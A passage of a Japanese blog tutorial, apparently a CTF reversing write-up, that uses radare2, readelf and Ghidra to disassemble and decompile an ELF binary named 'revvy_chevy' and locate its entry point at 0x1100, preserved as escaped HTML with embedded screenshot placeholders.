&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;0x00001100&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt; 0x00001130

&lt;span class=&quot;token comment&quot;&gt;# 関数の開始アドレスで pdf コマンドを実行すると逆アセンブル結果を取得できる&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;0x00001130&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt; pdf
            &lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; CALL XREF from entry.fini0 @ +0x27
┌ &lt;span class=&quot;token number&quot;&gt;34&lt;/span&gt;: fcn.00001130 &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
│           0x00001130      488d3de12e00.  lea rdi, qword &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;0x00004018&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;
│           0x00001137      488d05da2e00.  lea rax, qword &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;0x00004018&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;
│           0x0000113e      4839f8         &lt;span class=&quot;token function&quot;&gt;cmp&lt;/span&gt; rax, rdi
│       ┌─&lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt; 0x00001141      &lt;span class=&quot;token number&quot;&gt;7415&lt;/span&gt;           je 0x1158
│       │   0x00001143      488b058e2e00.  mov rax, qword &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;reloc._ITM_deregisterTMCloneTable&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;0x3fd8:8&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;
│       │   0x0000114a      4885c0         &lt;span class=&quot;token builtin class-name&quot;&gt;test&lt;/span&gt; rax, rax
│      ┌──&lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt; 0x0000114d      &lt;span class=&quot;token number&quot;&gt;7409&lt;/span&gt;           je 0x1158
│      ││   0x0000114f      ffe0           jmp rax
&lt;span class=&quot;token punctuation&quot;&gt;..&lt;/span&gt;
│      ││   &lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; CODE XREFS from fcn.00001130 @ 0x1141, 0x114d
└      └└─&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt; 0x00001158      c3             ret

&lt;span class=&quot;token comment&quot;&gt;# 関数の開始アドレスで pdc コマンドを実行するとデコンパイル結果を取得できる&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;0x00001130&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt; pdc
&lt;span class=&quot;token keyword&quot;&gt;function&lt;/span&gt; fcn.&lt;span class=&quot;token function-name function&quot;&gt;00001130&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    //  &lt;span class=&quot;token number&quot;&gt;4&lt;/span&gt; basic blocks
    loc_0x1130:
         //CALL XREF from entry.fini0 @ +0x27
       rdi &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; qword &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;0x00004018&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;
       rax &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; qword &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;0x00004018&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;
       var &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; rax - rdi
       &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;!&lt;/span&gt;var&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; goto 0x1158    //likely
       &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
        loc_0x1158:
           //CODE XREFS from fcn.00001130 @ 0x1141, 0x114d
           &lt;span class=&quot;token builtin class-name&quot;&gt;return&lt;/span&gt;
        loc_0x1143:
           rax &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; qword &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;reloc._ITM_deregisterTMCloneTable&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; //&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;0x3fd8:8&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;
           var &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; rax &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt; rax
           &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;!&lt;/span&gt;var&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; goto 0x1158    //likely
      &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;token builtin class-name&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    loc_0x114f:
       goto rax
&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;break&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;続いてはGUIから逆アセンブル結果やデコンパイル結果を確認してみましょう。&lt;/p&gt;
&lt;h2 id=&quot;ghidraでmain関数を解析する&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#ghidra%E3%81%A7main%E9%96%A2%E6%95%B0%E3%82%92%E8%A7%A3%E6%9E%90%E3%81%99%E3%82%8B&quot; aria-label=&quot;ghidraでmain関数を解析する permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Ghidraでmain関数を解析する&lt;/h2&gt;
&lt;p&gt;GhidaはNSAの開発したOSSのリバースエンジニアリングツールです。&lt;/p&gt;
&lt;p&gt;公式のインストール方法でセットアップしている場合、&lt;code class=&quot;language-text&quot;&gt;ghidraRun&lt;/code&gt;で起動することができます。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;$ ghidraRun&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://ghidra-sre.org/&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Ghidra&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;GhidraのGUIが起動したら、左上の[File]から[Import File]を選択して問題バイナリをロードします。&lt;/p&gt;
&lt;p&gt;ロードが完了したらインポートされたファイル名をクリックして解析を開始します。&lt;/p&gt;
&lt;p&gt;Ghidraの詳細な使い方は、[Help]の[Content]から開けるヘルプツールが結構詳しく書いてあるのでおすすめです。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 500px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/d20ea907f1aa45ddb3cf7ab760d61380/0b533/image-31.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 68.33333333333333%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAOCAYAAAAvxDzwAAAACXBIWXMAARlAAAEZQAGA43XUAAADB0lEQVQ4y52TW2yURRTHv1dpfYGkkfiomNQnQKoPJrxKojEGY0KlIuVaLBCgKZKGAmIxhgcSFC3aQAiQEEhIAdOml+22QApYROXS7rL3r3vrfrvfdW/dZeHH7Nd1FfCJk/wyZ87MnJk5/xlp19YWdrRuoGXjOvbs2sa3nV9zuGsf3x3ooHP3zgo76NzTxqH2VrY3zKd18Ty2vlNL69Iatix+hS1L5rFZ0CKQPKEwiqrhCcpMujwkkjq6mbExrDl0M42VnSUWjXBk1SK+X/EqHe/X0vZuDW0NgvdqbbYvq0H6/f4Ubp/Mg0k3E7fv4AvIYgOdpGpUUVI6mpEhEAiw+5NFtCyv44uG12hcUkfj0grLFrKpYQFS8TGYmRzpdIZkUiWTzfGEZ+2fvm5YXOkbZNg5hsMxgtPpxOEcZWjYwdWbE/zQ/iXS3IpnUzwR/ecpWzqXx+WK4fUaRA3wRQqUHv277sqPeysJXzjT/5tlWiiaRc7KE/z1FwKXfmNWxEuPivb45aMdSEk9I2qkihqZmLYI6aoYZd8UpbAE6UKRsKi3p+sgkZ5ufM2fE1j1KXrvxeqGfcfECe8+9BGSw8QTSSGAECOlVUmJfjk+HYmLTTXCiop75Qd4279ClB5zfIjw2qbq/fp/EgmN/Cy6lUVRFBKJhM1//Ug0SiAkE4lEmVY0NM89oo2foZw4wnTzh2inTlYTDvzcidTXfZDLxw4wdf8uQbHQ5/Xhdj+0n4jf7ycYDBIKhexWdt0in/SRGx8htn4NVu+lioiP7Xawex/S8Y/q6P74dbSYbAdLpZKoWdb2i8WiTaFQbgtkA/0Y13pQe3swRgYoVubkc3Pzh4/vRzq7+i3ONNWjRYN2sDCbFwnFzzAN4rEouiauqaZsyu9QNdJoQm3NMEglZsS4ijITp/yeHeWE51a/wemmt8kYalWtbImXstGTh5DON73JhbX1TA6dQ74zhv/WIN7xftS/nSiuq0T+HCVxbwzdc4P4g5vIf4zYhG47CAr8E8N4bgwQ+us6F79p5ilpPrLirsV0LQAAAABJRU5ErkJggg==&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/d20ea907f1aa45ddb3cf7ab760d61380/8ac56/image-31.webp 240w,
/static/d20ea907f1aa45ddb3cf7ab760d61380/d3be9/image-31.webp 480w,
/static/d20ea907f1aa45ddb3cf7ab760d61380/b0a15/image-31.webp 500w&quot;
              sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/d20ea907f1aa45ddb3cf7ab760d61380/8ff5a/image-31.png 240w,
/static/d20ea907f1aa45ddb3cf7ab760d61380/e85cb/image-31.png 480w,
/static/d20ea907f1aa45ddb3cf7ab760d61380/0b533/image-31.png 500w&quot;
            sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/d20ea907f1aa45ddb3cf7ab760d61380/0b533/image-31.png&quot;
            alt=&quot;2021/12/image-31.png&quot;
            title=&quot;2021/12/image-31.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;日本語の情報が欲しい場合は、WEBにはあまり体系化された情報が落ちていないので、&lt;a href=&quot;https://amzn.to/3robIsL&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Ghidra実践ガイド&lt;/a&gt;を読むのがいいと思います。&lt;/p&gt;
&lt;h3 id=&quot;エントリポイントを見つける&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%82%A8%E3%83%B3%E3%83%88%E3%83%AA%E3%83%9D%E3%82%A4%E3%83%B3%E3%83%88%E3%82%92%E8%A6%8B%E3%81%A4%E3%81%91%E3%82%8B&quot; aria-label=&quot;エントリポイントを見つける permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;エントリポイントを見つける&lt;/h3&gt;
&lt;p&gt;Ghidraの解析ウィンドウを開いたら、まずはmain関数の逆アセンブル結果とデコンパイル結果を見つけたいと思います。&lt;/p&gt;
&lt;p&gt;しかし、デフォルトの画面で左側にあるシンボルツリーからFunctionsの一覧を探したものの、main関数は見つけられませんでした。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 433px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/5ff45b653d46d7f7a557b5847605951b/55fc0/image-32.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 119.58333333333333%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAYCAYAAAD6S912AAAACXBIWXMAAAsTAAALEwEAmpwYAAACzElEQVQ4y52VWW/TQBRG83/hF7QgsbzBIzyCEA9QBAgQdEFsoq1Ek4pWaWkcx9mdZvMSp0lsJ8Qzh0mCaENS0mLpypY8c+a768SuXX/NlatvWV7aYGlpjVu337O8vMqNm+vcufuBe/e/8ODhFk+efuPV6wQb7/f4unlAInHEjyODVCrN1+1Ntr/H2dzcIvZufZ9Hj16y8iLByrMEaxtHfPyc49PnLFvbBXbiJb7vmSQPj0mlaxi5BsWyxXHVwXI8GpZNqVymaTuk9Qwx98SlXnqO5Vao14oMBh3+92m128QajotxsEpRy3Jca5IvVun0BvS6UsEFQsgpk3LWhBBjoOO2iPnhAKvVp1vp0LOhmpY0DUG9Keh2pFo22sRc0Fn7A+wFoZIa4NcDZD1CZiKoTE5k7sbTA8ZLYBroh30V3C6tkgc1tTilgKE8N06Tvaf/Z4BBf0DdamNlm4QW2ClBS7lr2wLHVu6rb88TWJbAbYnFCgMVw7rdoapbFCoD9lN9jpTKw8MITROqziJ0PSKZjNQGcUGXXZ8f+xYfdvJs7RVonwh6PUmoXI+iSXZH71O3/+GyH/Rx2yF9lZSKiVIzUTWyUimajteZjJ6vUAEdLyCo+ZimQFdZzijL5wVmJZopmwsqnADLZYFhTGKmZwTFkUI5C5zK+rwYOl6fsDpSKFU/ijFQ0yKKxWmFXATY9UNVDh5BYwQcklEKM8ZwrHAUgksDaw0bzXhD7jhLIVcgUJ0zk005xs4v9L+Bo/Gzn3zMgX5AXgFN01SF7DEcDs9A5Txx84G9IKDTMumcdFTdhXS7Xfye/2eCSDldyAuB/cHPf/StXDgDZ4Ch6uWJS/NH0qKxNTO+JsCLqVnkyRg4+B38y6g5b2J7LQU0cjly+TzVWgNbnWCrK+Gy5rguNcslqZeI7e7uEo/H0dK6ur0qqt3MS1vZrKBli3xKaPwCuqEqtxIWjbEAAAAASUVORK5CYII=&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/5ff45b653d46d7f7a557b5847605951b/8ac56/image-32.webp 240w,
/static/5ff45b653d46d7f7a557b5847605951b/aff3a/image-32.webp 433w&quot;
              sizes=&quot;(max-width: 433px) 100vw, 433px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/5ff45b653d46d7f7a557b5847605951b/8ff5a/image-32.png 240w,
/static/5ff45b653d46d7f7a557b5847605951b/55fc0/image-32.png 433w&quot;
            sizes=&quot;(max-width: 433px) 100vw, 433px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/5ff45b653d46d7f7a557b5847605951b/55fc0/image-32.png&quot;
            alt=&quot;2021/12/image-32.png&quot;
            title=&quot;2021/12/image-32.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;そのため、エントリポイントの逆アセンブル結果から、main関数のアドレスを特定していきます。&lt;/p&gt;
&lt;p&gt;エントリポイントとは、ELFバイナリが実行されたときにまず初めに呼び出される関数です。&lt;/p&gt;
&lt;p&gt;エントリポイントのファイルオフセットは、ELFヘッダの25バイト目から8バイト分の領域を使って定義されています。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 500px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/c63d79134c96c957016e029ea8f76673/0b533/image-33.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 37.5%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAYAAAD5nd/tAAAACXBIWXMAARlAAAEZQAGA43XUAAABwElEQVQoz22SS0/bUBCFvUA8V6hUYgOUR6I0sZ2EOsRJSBwnToJjO7FsJ+EpFjyE1EKR+AGsQaIVCwRqoRWb/s3TmRskWLC4Gt+ZO9+cObJU0xRUcnGUlBjWlTjK2RhKSxnoKxYK8Rr0uAUjYcKVq4jyDjy1BjtpwE4Z4ttVTax9SMJaKaIZK0Harw7QURrw0y20qTHItuGkTIRaC36mjkhr4uriEv/un/H7+g5/f/7Cnx8PeL59xNPNPYx5DZ9H5iCPfUJydAHSdsWHIxuI9DY6DNAddNJ19HSX7g0Emo09M8Rp7wjnmyf4Fh7ie/8YX4MDnFGuOJtGimDpqWWodKTdagBXMdEvMMB6AdUR5GwBDNfa8GgAr9ileitRFnWOfNemE5DHF6FOLosj7RhDIDe65EmPFbLSPCnONoRv/mpTHB7apdyg5InaVtmH/lEmhS/ACQLyOmxuSIr4ca/gicl9igzhAT7l3wI5umodW+td5GdS5N8bhXtmJFYKtA3yzsKg2Bk2FQn4pTUErjbIZ1PkhEKKHr3dfk/hJk1xaGX2yE5WyLsNaq6KAWwBQ3kDBnCOwWFuGCOyiX+ZVw+X8B+vXxjBc3ZbkgAAAABJRU5ErkJggg==&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/c63d79134c96c957016e029ea8f76673/8ac56/image-33.webp 240w,
/static/c63d79134c96c957016e029ea8f76673/d3be9/image-33.webp 480w,
/static/c63d79134c96c957016e029ea8f76673/b0a15/image-33.webp 500w&quot;
              sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/c63d79134c96c957016e029ea8f76673/8ff5a/image-33.png 240w,
/static/c63d79134c96c957016e029ea8f76673/e85cb/image-33.png 480w,
/static/c63d79134c96c957016e029ea8f76673/0b533/image-33.png 500w&quot;
            sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/c63d79134c96c957016e029ea8f76673/0b533/image-33.png&quot;
            alt=&quot;2021/12/image-33.png&quot;
            title=&quot;2021/12/image-33.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;※ リトルエンディアン形式で&lt;code class=&quot;language-text&quot;&gt;0x1100&lt;/code&gt;がエントリポイントのアドレスです。&lt;/p&gt;
&lt;p&gt;前述した&lt;code class=&quot;language-text&quot;&gt;readelf&lt;/code&gt;コマンドの&lt;code class=&quot;language-text&quot;&gt;-h&lt;/code&gt;を利用することで、ELFヘッダ内の情報を簡単に参照することができます。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;$ readelf -h revvy_chevy
ELF Header:
  Magic:   7f &lt;span class=&quot;token number&quot;&gt;45&lt;/span&gt; 4c &lt;span class=&quot;token number&quot;&gt;46&lt;/span&gt; 02 01 01 00 00 00 00 00 00 00 00 00 
  Class:                             ELF64
  Data:                              &lt;span class=&quot;token number&quot;&gt;2&lt;/span&gt;&apos;s complement, little endian
  Version:                           &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;current&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
  OS/ABI:                            UNIX - System V
  ABI Version:                       &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;
  Type:                              DYN &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;Shared object &lt;span class=&quot;token function&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
  Machine:                           Advanced Micro Devices X86-64
  Version:                           0x1
  Entry point address:               0x1100
  Start of program headers:          &lt;span class=&quot;token number&quot;&gt;64&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;bytes into &lt;span class=&quot;token function&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
  Start of section headers:          &lt;span class=&quot;token number&quot;&gt;12624&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;bytes into &lt;span class=&quot;token function&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
  Flags:                             0x0
  Size of this header:               &lt;span class=&quot;token number&quot;&gt;64&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;bytes&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
  Size of program headers:           &lt;span class=&quot;token number&quot;&gt;56&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;bytes&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
  Number of program headers:         &lt;span class=&quot;token number&quot;&gt;13&lt;/span&gt;
  Size of section headers:           &lt;span class=&quot;token number&quot;&gt;64&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;bytes&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
  Number of section headers:         &lt;span class=&quot;token number&quot;&gt;29&lt;/span&gt;
  Section header string table index: &lt;span class=&quot;token number&quot;&gt;28&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;ここで、エントリポイントのアドレスが&lt;code class=&quot;language-text&quot;&gt;0x1100&lt;/code&gt;であることがわかったので、Ghidraのシンボルツリーから&lt;code class=&quot;language-text&quot;&gt;entry&lt;/code&gt;関数のアドレスを開いてみましょう。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;entry&lt;/code&gt;関数の逆アセンブル結果とデコンパイル結果が表示されましたが、アドレスを見ると&lt;code class=&quot;language-text&quot;&gt;0x1100&lt;/code&gt;ではなく&lt;code class=&quot;language-text&quot;&gt;0x101100&lt;/code&gt;になっています。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 500px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/7510255b616b62e8ea1b8b82301bd8f2/0b533/image-35.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 52.916666666666664%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAYAAAB/Ca1DAAAACXBIWXMAARlAAAEZQAGA43XUAAAB5UlEQVQoz32S627TQBCF/f6PhITKDwQqCClAaVDTNo5jO3Z8Xd/WXu/6Y9KmtEXASGdnbe8cn7Mz3tt3W95c3HLx3ufjp4Avq4j1JiWIS8IkZxul3O8PXF2vubz8wOrrmqtv19xsfOIwJUlKkjQjy3OiKMYzQDFCPUNcGilu8aMe/zAQK8uhsSSN43DM6HrLMBom07LgpHJhWSSfcA6vkkOhEEUnskSxCRV+1hNVo7zXhIVmX/TcbXdUlabtDEXWoaoa3Xborhe09NNEZyY8pR1+MbBNe4JkZBsPQnwiNBzUTCAkP9OCz6sVfaexi4WzqJf4rdDYhfXujs1OkVeWY9mjBsVgHMMkMAuNNnyXO7TWPhSJ0Yf1JZblEd7pQBiExHJvvdjvuoG2yXD2+bfOWX4IoTHzI+Gy/AUPH/CcLErVBMFErRyzNdT1yPHozkrAOsfN7S3z/Ez4Kp6enwiLosD3NU3rRIWhaTpyab0Wq1q6qvUkY/IH4SvHLwndQivdmqZZMMq+Z9CjFBtG6dw0SR5H9vtA1Ntz/fJPeE+qZ2lO04yidqRuR7H52ADjDGae2EfRWc7/w6tUy30Qc32T48sMJlnN/SFinx5RdUNRVWK/ZLsLSPNapqARKI7FGed9LrkoS34BMSBNxJrnD3wAAAAASUVORK5CYII=&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/7510255b616b62e8ea1b8b82301bd8f2/8ac56/image-35.webp 240w,
/static/7510255b616b62e8ea1b8b82301bd8f2/d3be9/image-35.webp 480w,
/static/7510255b616b62e8ea1b8b82301bd8f2/b0a15/image-35.webp 500w&quot;
              sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/7510255b616b62e8ea1b8b82301bd8f2/8ff5a/image-35.png 240w,
/static/7510255b616b62e8ea1b8b82301bd8f2/e85cb/image-35.png 480w,
/static/7510255b616b62e8ea1b8b82301bd8f2/0b533/image-35.png 500w&quot;
            sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/7510255b616b62e8ea1b8b82301bd8f2/0b533/image-35.png&quot;
            alt=&quot;2021/12/image-35.png&quot;
            title=&quot;2021/12/image-35.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
